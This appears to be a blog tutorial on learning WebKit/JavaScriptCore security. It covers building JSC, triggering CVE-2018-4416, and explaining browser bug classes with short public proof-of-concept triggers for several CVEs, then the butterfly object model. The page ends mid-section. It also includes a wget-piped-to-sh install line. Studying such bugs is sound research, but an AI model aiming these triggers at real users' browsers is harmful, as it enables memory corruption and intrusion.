<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>WebKit Exploitation Tutorial</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
    /* CSS for syntax highlighting */
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { color: #008000; } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { color: #008000; font-weight: bold; } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <link rel="stylesheet" href="../assets/page.css" />
</head>
<body>
<header id="title-block-header">
<h1 class="title">WebKit Exploitation Tutorial</h1>
</header>
<blockquote>
<p>The technique shared in the post may be deprecated in newer
versions.</p>
</blockquote>
<h1 id="preface">Preface</h1>
<p>OKay, binary security is not only <em>heap</em> and <em>stack</em>,
we still have a lot to discover despite regular CTF challenge. Browser,
Virtual Machine, and Kernel all play an important role in binary
security. And I decide to study browser first.</p>
<p>I choose a relatively easy one: <em>WebKit</em>. (ChakraCore might be
easier, LoL. But there's a rumor about Microsoft canceling the project.
Thus I decided not to choose it).</p>
<p>I will write a series of posts to record my notes in studying
<em>WebKit</em> security. It's also my first time learning Browser
Security, my posts <strong>probably</strong> will have <strong>lots
of</strong> mistakes. If you notice them, don't be hesitate to contact
me for corrections.</p>
<p>Before reading it, you need to know: - C++ grammar - Assembly
Language grammar - Installation of Virtual Machine - Familiar to Ubuntu
and its command line - Basic compile theory concepts</p>
<hr />
<h1 id="setup">Setup</h1>
<p>Okay, let's start now.</p>
<h2 id="virtual-machine">Virtual Machine</h2>
<p>First, we need to install a VM as our testing target. Here, I choose
<em>Ubuntu 18.04 LTS</em> and /Ubuntu 16.04 LTS/as our target host. You
can download <a href="https://www.ubuntu.com/">here</a>. If I don't
specify the version, please use <strong>18.04 LTS as default
version</strong>.</p>
<p>Mac might be a more appropriate choice since it has XCode and Safari.
Consider to MacOS's high resource consumption and unstable update, I
would rather use Ubuntu.</p>
<p>We need a VM software. I prefer to use <a
href="https://www.vmware.com/">VMWare</a>. Parallel Desktop and
VirtualBox(Free) are also fine, it depends on your personal habit.</p>
<p>I won't tell you how to install Ubuntu on VMWare step by step.
However, I still need to remind you to allocate <strong>as much memory
and CPUs as possible</strong> because compilation consumes a huge amount
of resource. An 80GB disk should be enough to store source code and
compiled files.</p>
<h2 id="source-code">Source Code</h2>
<p>You can download WebKit source code in three ways: <a
href="https://github.com/WebKit/webkit"><em>git</em></a>, <em>svn</em>,
and <a
href="https://webkit.org/getting-the-code/"><em>archive</em></a>.</p>
<p>The default version manager of WebKit is svn. But I choose git(too
unfamiliar to use svn):</p>
<pre class="example"><code>git clone git://git.webkit.org/WebKit.git WebKit
</code></pre>
<h2 id="debugger-and-editor">Debugger and Editor</h2>
<p>IDE consumes lots of resource, so I use <strong>vim</strong> to edit
source code.</p>
<p>Most debug works I have seen use <strong>lldb</strong> which I am not
familiar to. Therefore, I also install <strong>gdb</strong> with
<strong>gef</strong> plugin.</p>
<pre class="shell"><code>sudo apt install vim gdb lldb
wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
</code></pre>
<h2 id="test">Test</h2>
<h3 id="compiling-javascriptcore">Compiling JavaScriptCore</h3>
<p>Compiling a full WebKit takes a large amount of time. We only compile
JSC(JavaScript Core) currently, where most vulnerabilities come
from.</p>
<p>Now, you should in the <strong>root directory</strong> of WebKit
source code. Run this to prepare dependencies:</p>
<pre class="shell"><code>Tools/gtk/install-dependencies
</code></pre>
<p>Even though we still not compile full WebKit now, you can install
remaining dependencies first for future testing. <strong>This step is
not required in compiling JSC if you don't want to spend too much
time</strong>:</p>
<pre class="shell"><code>Tools/Scripts/update-webkitgtk-libs
</code></pre>
<p>After that, we can compile JSC:</p>
<pre class="shell"><code>Tools/Scripts/build-webkit --jsc-only
</code></pre>
<p>A couple of minutes later, we can run JSC by:</p>
<pre class="shell"><code>WebKitBuild/Release/bin/jsc
</code></pre>
<p>Let's do some tests:</p>
<pre class="example"><code>&gt;&gt;&gt; 1+1
2
&gt;&gt;&gt; var obj = {a:1, b:&quot;test&quot;}
undefined
&gt;&gt;&gt; JSON.stringify(obj)
{&quot;a&quot;:1,&quot;b&quot;:&quot;test&quot;}
</code></pre>
<h3 id="triggering-bugs">Triggering Bugs</h3>
<blockquote>
<p>Ubuntu 18.04 LTS here</p>
</blockquote>
<p>We use <a
href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1652">CVE-2018-4416</a>
to test, here is the PoC. Store it to <code
class="verbatim">poc.js</code> at the same folder of <code
class="verbatim">jsc</code>:</p>
<pre class="example"><code>function gc() {
    for (let i = 0; i &lt; 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(obj) {
    // Starting the optimization.
    for (let i = 0; i &lt; 500; i++) {

    }

    let tmp = {a: 1};

    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {  // The structure ID of &quot;tmp&quot; is stored in a JSPropertyNameEnumerator.
        tmp.__proto__ = {};

        gc();

        obj.__proto__ = {};  // The structure ID of &quot;obj&quot; equals to tmp&#39;s.

        return obj[k];  // Type confusion.
    }
}

opt({});

let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x1234;

let fake_object = opt(fake_object_memory);
print(fake_object);
</code></pre>
<p>First, switch to the vulnerable version:</p>
<pre class="example"><code>git checkout -b CVE-2018-4416 034abace7ab
</code></pre>
<blockquote>
<p>It may spend even more time than compiling</p>
</blockquote>
<p>Run: <code class="verbatim">./jsc poc.js</code>, and we can get:</p>
<pre class="example"><code>ASSERTION FAILED: structureID &lt; m_capacity
../../Source/JavaScriptCore/runtime/StructureIDTable.h(129) : JSC::Structure* JSC::StructureIDTable::get(JSC::StructureID)
1   0x7f055ef18c3c WTFReportBacktrace
2   0x7f055ef18eb4 WTFCrash
3   0x7f055ef18ec4 WTFIsDebuggerAttached
4   0x5624a900451c JSC::StructureIDTable::get(unsigned int)
5   0x7f055e86f146 bool JSC::JSObject::getPropertySlot&lt;true&gt;(JSC::ExecState*, JSC::PropertyName, JSC::PropertySlot&amp;)
6   0x7f055e85cf64
7   0x7f055e846693 JSC::JSObject::toPrimitive(JSC::ExecState*, JSC::PreferredPrimitiveType) const
8   0x7f055e7476bb JSC::JSCell::toPrimitive(JSC::ExecState*, JSC::PreferredPrimitiveType) const
9   0x7f055e745ac8 JSC::JSValue::toStringSlowCase(JSC::ExecState*, bool) const
10  0x5624a900b3f1 JSC::JSValue::toString(JSC::ExecState*) const
11  0x5624a8fcc3a9
12  0x5624a8fcc70c
13  0x7f05131fe177
Illegal instruction (core dumped)
</code></pre>
<p>If we run this on latest version(<code
class="verbatim">git checkout master</code> to switch back, and delete
build content <code class="verbatim">rm -rf WebKitBuild/Relase/*</code>
and <code class="verbatim">rm -rf WebKitBuild/Debug/*</code>):</p>
<pre class="example"><code>./jsc poc.js 
WARNING: ASAN interferes with JSC signal handlers; useWebAssemblyFastMemory will be disabled.
OK
undefined

=================================================================
==96575==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 96 byte(s) in 3 object(s) allocated from:
    #0 0x7fe1f579e458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)
    #1 0x7fe1f2db7cc8 in __gnu_cxx::new_allocator&lt;std::_Sp_counted_deleter&lt;std::mutex*, std::__shared_ptr&lt;std::mutex, (__gnu_cxx::_Lock_policy)2&gt;::_Deleter&lt;std::allocator&lt;std::mutex&gt; &gt;, std::allocator&lt;std::mutex&gt;, (__gnu_cxx::_Lock_policy)2&gt; &gt;::allocate(unsigned long, void const*) (/home/browserbox/WebKit/WebKitBuild/Debug/lib/libJavaScriptCore.so.1+0x5876cc8)
    #2 0x7fe1f2db7a7a in std::allocator_traits&lt;std::allocator&lt;std::_Sp_counted_deleter&lt;std::mutex*, std::__shared_ptr&lt;std::mutex, (__gnu_cxx::_Lock_policy)2&gt;::_Deleter&lt;std::allocator&lt;std::mutex&gt; &gt;, std::allocator&lt;std::mutex&gt;, (__gnu_cxx::_Lock_policy)2&gt; &gt; &gt;::allocate(std::allocator&lt;std::_Sp_counted_deleter&lt;std::mutex*, std::__shared_ptr&lt;std::mutex, 

... // lots of error message

SUMMARY: AddressSanitizer: 216 byte(s) leaked in 6 allocation(s).
</code></pre>
<p>Now, we succeed triggering a bug!</p>
<p>I am not gonna to explain the detail(I don't know either). Hope we
can figure out the root cause after a few weeks</p>
<hr />
<h1 id="understanding-webkit-vulnerability">Understanding WebKit
Vulnerability</h1>
<p>Now, it's time to discuss something deeper. Before we start to talk
about WebKit architecture, let's find out common bugs in WebKit.</p>
<p>Here, I only discuss binary level related bugs. Some higher level
bugs, like <em>URL Spoof</em> or <em>UXSS</em>, are not our topic.
Examples below <strong>are not merely from WebKit</strong>. Some are
Chrome's bugs. We will introduce briefly. And analyze PoC specifically
later.</p>
<p>Before reading this part, you are strongly recommended to read some
materials about compiler theory. Basic Pwn knowledge should also be
learned. My explanation is not clear. Again, correct my mistakes if you
find.</p>
<p>This post will be updated several times as my understanding in JSC
becomes deeper. Don't forget to check it later.</p>
<h2 id="use-after-free">1. Use After Free</h2>
<p>A.k.a <code class="verbatim">UAF</code>. This is common in CTF
challenge, a classical scenario:</p>
<div class="sourceCode" id="cb12" data-org-language="C"><pre
class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span><span class="op">*</span> a <span class="op">=</span> malloc<span class="op">(</span><span class="bn">0x100</span><span class="op">);</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>free<span class="op">(</span>a<span class="op">);</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">%s</span><span class="st">&quot;</span><span class="op">,</span> a<span class="op">);</span></span></code></pre></div>
<p>Because of some logic errors. The code will reuse freed memory.
Usually, we can leak or write once we controlled the freed memory.</p>
<p><strong>CVE-2017-13791</strong> is an example for WebKit UAF. Here is
the PoC:</p>
<pre class="example"><code>&lt;script&gt;
  function jsfuzzer() {
    textarea1.setRangeText(&quot;foo&quot;);
    textarea2.autofocus = true;
    textarea1.name = &quot;foo&quot;;
    form.insertBefore(textarea2, form.firstChild);
    form.submit();
  }
  function eventhandler2() {
    for(var i=0;i&lt;100;i++) {
      var e = document.createElement(&quot;input&quot;);
      form.appendChild(e);
    }
  }
&lt;/script&gt;
&lt;body onload=jsfuzzer()&gt;
  &lt;form id=&quot;form&quot; onchange=&quot;eventhandler2()&quot;&gt;
  &lt;textarea id=&quot;textarea1&quot;&gt;a&lt;/textarea&gt;
  &lt;object id=&quot;object&quot;&gt;&lt;/object&gt;
  &lt;textarea id=&quot;textarea2&quot;&gt;b&lt;/textarea&gt;
</code></pre>
<h2 id="out-of-bound">2. Out of Bound</h2>
<p>A.k.a <code class="verbatim">OOB</code>. It's like the overflow in
Browser. Still, we can read/write nearby memory. <code
class="verbatim">OOB</code> frequently occurs in false optimization of
an array or insufficient check. For example(<a
href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1033">CVE-2017-2447</a>):</p>
<pre class="example"><code>var ba;
function s(){
    ba = this;
}

function dummy(){
    alert(&quot;just a function&quot;);
}

Object.defineProperty(Array.prototype, &quot;0&quot;, {set : s });
var f = dummy.bind({}, 1, 2, 3, 4);
ba.length = 100000;
f(1, 2, 3);
</code></pre>
<blockquote>
<p>When Function.bind is called, the arguments to the call are
transferred to an Array before they are passed to
JSBoundFunction::JSBoundFunction. Since it is possible that the Array
prototype has had a setter added to it, it is possible for user script
to obtain a reference to this Array, and alter it so that the length is
longer than the backing native butterfly array. Then when
boundFunctionCall attempts to copy this array to the call parameters, it
assumes the length is not longer than the allocated array (which would
be true if it wasn't altered) and reads out of bounds.</p>
</blockquote>
<p>In most cases. we cannot directly overwrite <code
class="verbatim">$RIP</code> register. Exploit writers always craft fake
array to turn partial R/W to arbitrary R/W.</p>
<h2 id="type-confusion">3. Type Confusion</h2>
<p>It's a special vulnerability that happens in applications with the
compiler. And this bug is slightly difficult to explain.</p>
<p>Imagine we have the following object(32 bits):</p>
<div class="sourceCode" id="cb15" data-org-language="C"><pre
class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> example<span class="op">{</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> length<span class="op">;</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>content<span class="op">;</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>Then, if we have a <code class="verbatim">length</code> == <code
class="verbatim">5</code> with a <code class="verbatim">content</code>
pointer object in the memory, it probably shows like this:</p>
<pre class="example"><code>0x00: 0x00000005 -&gt; length
0x04: 0xdeadbeef -&gt; pointer
</code></pre>
<p>Once we have another object:</p>
<div class="sourceCode" id="cb17" data-org-language="C"><pre
class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> exploit<span class="op">{</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> length<span class="op">;</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">void</span> <span class="op">(*</span>exp<span class="op">)();</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>We can force the compiler to parse <code
class="verbatim">example</code> object as <code
class="verbatim">exploit</code> object. We can turn the <code
class="verbatim">exp</code> function to arbitrary address and RCE.</p>
<p>An example for type confusion:</p>
<pre class="example"><code>var q;
function g(){
    q = g.caller;
    return 7;
}

var a = [1, 2, 3];
a.length = 4;
Object.defineProperty(Array.prototype, &quot;3&quot;, {get : g});
[4, 5, 6].concat(a);
q(0x77777777, 0x77777777, 0);
</code></pre>
<p>Cited from <a
href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032">CVE-2017-2446</a></p>
<blockquote>
<p>If a builtin script in webkit is in strict mode, but then calls a
function that is not strict, this function is allowed to call
Function.caller and can obtain a reference to the strict function.</p>
</blockquote>
<h2 id="integer-overflow">4. Integer Overflow</h2>
<p>Integer Overflow is also common in CTF. Though Integer Overflow
itself cannot lead RCE, it probably leads to <code
class="verbatim">OOB</code>.</p>
<p>It's not difficult to understand this bug. Imagine you are running
below code in 32 bits machine:</p>
<pre class="example"><code>mov eax, 0xffffffff
add eax, 2
</code></pre>
<p>Because the maximum of <code class="verbatim">eax</code> is <code
class="verbatim">0xffffffff</code>. In cannot contact <code
class="verbatim">0xffffffff</code> + <code class="verbatim">2</code> =
<code class="verbatim">0x100000001</code>. Thus, the higher byte will be
overflowed(eliminated). The final result of <code
class="verbatim">eax</code> is <code
class="verbatim">0x00000001</code>.</p>
<p>This is an example from WebKit(<a
href="https://phoenhex.re/2017-06-02/arrayspread">CVE-2017-2536</a>):</p>
<pre class="example"><code>var a = new Array(0x7fffffff);
var x = [13, 37, ...a, ...a];
</code></pre>
<blockquote>
<p>The length is not correctly checked resulting we can overflow the
length via expanding an array to the old one. Then, we can use the
extensive array to <code class="verbatim">OOB</code>.</p>
</blockquote>
<h2 id="else">5. Else</h2>
<p>Some bugs are difficult to categorize: - Race Condition - Unallocated
Memory - …</p>
<p>I will explain them in detail later.</p>
<hr />
<h1 id="javascriptcore-in-depth">JavaScriptCore in Depth</h1>
<p>The Webkit primarily includes: - JavaScriptCore: JavaScript executing
engine. - WTF: <em>Web Template Library</em>, replacement for C++ STL
lib. It has string operations, smart pointer, and etc. The heap
operation is also unique here. - DumpRenderTree: Produce <code
class="verbatim">RenderTree</code> - WebCore: The most complicated part.
It has CSS, DOM, HTML, render, and etc. Almost every part of the browser
despite components mentioned above.</p>
<p>And the JSC has: - <strong>lexer</strong> - <strong>parser</strong> -
start-up interpreter (<strong>LLInt</strong>) - three javascript JIT
compiler, their compile time gradually becomes longer but run faster and
faster: + <strong>baseline JIT</strong>, the initial JIT + a low-latency
optimizing JIT (<strong>DFG</strong>) + a high-throughput optimizing JIT
(<strong>FTL</strong>), final phase of JIT - two WebAssembly execution
engines: + BBQ + OMG</p>
<blockquote>
<p>Still a disclaimer, this post might be <strong>inaccurate</strong> or
<strong>wrong</strong> in explaining WebKit mechanisms</p>
</blockquote>
<p>If you have learned basic compile theory courses,
<strong>lexer</strong> and <strong>parser</strong> are as usual as what
taught in classes. But the code generation part is frustrating. It has
one interpreter and three compilers, WTF? JSC also has many other
unconventional features, let's have a look:</p>
<h2 id="jsc-value-representation">JSC Value Representation</h2>
<p>To easier identifying, JSC's value represents differently: - pointer
: <code class="verbatim">0000:PPPP:PPPP:PPPP</code> (begins with 0000,
then its address) - double (begins with 0001 or FFFE): + <code
class="verbatim">0001:****:****:****</code> + <code
class="verbatim">FFFE:****:****:****</code> - integer: <code
class="verbatim">FFFF:0000:IIII:IIII</code> (use <code
class="verbatim">IIII:IIII</code> for storing value) - false: <code
class="verbatim">0x06</code> - true: <code class="verbatim">0x07</code>
- undefined: <code class="verbatim">0x0a</code> - null: <code
class="verbatim">0x02</code></p>
<p><code class="verbatim">0x0</code>, however, is not a valid value and
can lead to a crash.</p>
<h2 id="jsc-object-model">JSC Object Model</h2>
<p>Unlike Java, which has fix class member, JavaScript allows people to
add properties any time.</p>
<p>So, despite traditionally statically align properties, JSC has a
<strong>butterfly pointer</strong> for adding dynamic properties. It's
like an additional array. Let's explain it in several situations.</p>
<p>Also, JSArray will always be allocated to <strong>butterfly
pointer</strong> since they change dynamically.</p>
<p>We can understand the concept easily with the following graph:</p>
<h3 id="x0-fast-jsobject">0x0 Fast JSObject</h3>
<p>The properties are initialized:</p>
<pre class="example"><code>var o = {f: 5, g: 6};
</code></pre>
<p>The butterfly pointer will be null here since we only have static
properties:</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|    NULL    | --&gt; Butterfly Pointer
--------------
|  0xffff000 | --&gt; 5 in JS format
|  000000005 | 
--------------
|  0xffff000 |
|  000000006 | --&gt; 6 in JS format
--------------
</code></pre>
<p>Let's expand our knowledge of JSObject. As we see, each <code
class="verbatim">structure ID</code> has a matched structure table.
Inside the table, it contains the property names and their offsets. In
our previous object <code class="verbatim">o</code>, the table looks
like:</p>
<table>
<thead>
<tr class="header">
<th>property name</th>
<th>location</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>"f"</td>
<td>inline(0)</td>
</tr>
<tr class="even">
<td>"g"</td>
<td>inline(1)</td>
</tr>
</tbody>
</table>
<p>When we want to retrieve a value(e.g. =var v = o.f=), following
behaviors will happen:</p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>o<span class="op">-&gt;</span>structureID <span class="op">==</span> <span class="dv">42</span><span class="op">)</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>    v <span class="op">=</span> o<span class="op">-&gt;</span>inlineStorage<span class="op">[</span><span class="dv">0</span><span class="op">]</span></span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span></span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>    v <span class="op">=</span> slowGet<span class="op">(</span>o<span class="op">,</span> “f”<span class="op">)</span></span></code></pre></div>
<p>You might wonder why the compiler will directly retrieve the value
via offset when knowing the <code class="verbatim">ID</code> is <code
class="verbatim">42</code>. This is a mechanism called <strong>inline
caching</strong>, which helps us to get value faster. We won't talk
about this much, <a
href="http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf">click
here</a> for more details.</p>
<h3 id="x1-jsobject-with-dynamically-added-fields">0x1 JSObject with
dynamically added fields</h3>
<pre class="example"><code>var o = {f: 5, g: 6};
o.h = 7;
</code></pre>
<p>Now, the butterfly has a slot, which is 7.</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|  butterfly | -|  -------------
--------------  |  | 0xffff000 |
|  0xffff000 |  |  | 000000007 |
|  000000005 |  |  -------------
--------------  -&gt; |    ...    |
|  0xffff000 |
|  000000006 | 
--------------
</code></pre>
<h3 id="x2-jsarray-with-room-for-3-array-elements">0x2 JSArray with room
for 3 array elements</h3>
<pre class="example"><code>var a = [];
</code></pre>
<p>The butterfly initializes an array with estimated size. The first
element <code class="verbatim">0</code> means a number of used slots.
And <code class="verbatim">3</code> means the max slots:</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|  butterfly | -|  -------------
--------------  |  |     0     |
                |  ------------- (8 bits for these two elements)
                |  |     3     |
                -&gt; -------------
                   |   &lt;hole&gt;  |
                   -------------
                   |   &lt;hole&gt;  |
                   -------------
                   |   &lt;hole&gt;  |
                   -------------
</code></pre>
<h3 id="x3-object-with-fast-properties-and-array-elements">0x3 Object
with fast properties and array elements</h3>
<pre class="example"><code>var o = {f: 5, g: 6};
o[0] = 7;
</code></pre>
<p>We filled an element of the array, so <code
class="verbatim">0=(used slots) increases to =1</code> now:</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|  butterfly | -|  -------------
--------------  |  |     1     |
|  0xffff000 |  |  -------------
|  000000005 |  |  |     3     |
--------------  -&gt; -------------
|  0xffff000 |     | 0xffff000 |
|  000000006 |     | 000000007 |
--------------     -------------
                   |   &lt;hole&gt;  |
                   -------------
                   |   &lt;hole&gt;  |
                   -------------
</code></pre>
<h3
id="x4-object-with-fast-and-dynamic-properties-and-array-elements">0x4
Object with fast and dynamic properties and array elements</h3>
<pre class="example"><code>var o = {f: 5, g: 6};
o[0] = 7;
o.h = 8;
</code></pre>
<p>The new member will be appended before the pointer address. Arrays
are placed on the right and attributes are on the left of butterfly
pointer, just like the wing of a butterfly:</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|  butterfly | -|  -------------
--------------  |  | 0xffff000 |
|  0xffff000 |  |  | 000000008 |
|  000000005 |  |  ------------- 
--------------  |  |     1     |
|  0xffff000 |  |  -------------
|  000000006 |  |  |     2     |
--------------  -&gt; ------------- (pointer address)
                   | 0xffff000 |
                   | 000000007 |
                   -------------
                   |   &lt;hole&gt;  |
                   -------------
</code></pre>
<h3 id="x5-exotic-object-with-dynamic-properties-and-array-elements">0x5
Exotic object with dynamic properties and array elements</h3>
<pre class="example"><code>var o = new Date();
o[0] = 7;
o.h = 8;
</code></pre>
<p>We extend the butterfly with a built-in class, the static properties
will not change:</p>
<pre class="example"><code>--------------
|structure ID|
--------------
|  indexing  |
--------------
|    type    |
--------------
|    flags   |
--------------
| call state |
--------------
|  butterfly | -|  -------------
--------------  |  | 0xffff000 |
|    &lt; C++   |  |  | 000000008 |
|   State &gt;  |  -&gt; -------------
--------------     |     1     |
|    &lt; C++   |     -------------
|   State &gt;  |     |     2     |
--------------     -------------
                   | 0xffff000 |
                   | 000000007 |
                   -------------
                   |   &lt;hole&gt;  |
                   -------------
</code></pre>
<h2 id="type-inference">Type Inference</h2>
<p>JavaScript is a weak, dynamic type language. The compiler will do a
lot of works in type inference, causing it becomes extremely
complicated.</p>
<h3 id="watchpoints">Watchpoints</h3>
<p>Watchpoints can happen in the following cases: - haveABadTime -
Structure transition - InferredValue - InferredType - and many
others…</p>
<p>When above situations happen, it will check whether watchpoint has
optimized. In WebKit, it represents like this:</p>
<div class="sourceCode" id="cb34"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Watchpoint <span class="op">{</span></span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span><span class="op">:</span></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">virtual</span> <span class="dt">void</span> fire<span class="op">()</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<p>For example, the compiler wants to optimize <code
class="verbatim">42.toString()</code> to <code
class="verbatim">"42"</code> (return <strong>directly</strong> rather
than use code to convert), it will check if it's already invalidated.
Then, If valid, register watchpoint and do the optimization.</p>
<h2 id="compilers">Compilers</h2>
<h3 id="x0.-llint">0x0. LLInt</h3>
<p>At the very beginning, the interpreter will generate <strong>byte
code template</strong>. Use JVM as an example, to executes <code
class="verbatim">.class</code> file, which is another kind of byte code
template. Byte code helps to execute easier:</p>
<pre class="example"><code>parser -&gt; bytecompiler -&gt; generatorfication
-&gt; bytecode linker -&gt; LLInt 
</code></pre>
<h3 id="x1.-baseline-jit-and-byte-code-template">0x1. Baseline JIT and
Byte Code Template</h3>
<p>Most basic JIT, it will generate <code
class="verbatim">byte code template</code> here. For example, this is
<em>add</em> in javascript:</p>
<pre class="example"><code>function foo(a, b)
{
return a + b;
}
</code></pre>
<p>This is bytecode IL, which is more straightforward without
sophisticated lexes and more convenient to convert to asm:</p>
<pre class="example"><code>[ 0] enter
[ 1] get_scope loc3
[ 3] mov loc4, loc3
[ 6] check_traps
[ 7] add loc6, arg1, arg2
[12] ret loc6
</code></pre>
<p>Code segment <code class="verbatim">7</code> and <code
class="verbatim">12</code> can result following <strong>DFG</strong> IL
(which we talk next). we can notice that it has many type related
information when operating. In line 4, the code will check if the
returning type matches:</p>
<div class="sourceCode" id="cb38"><pre
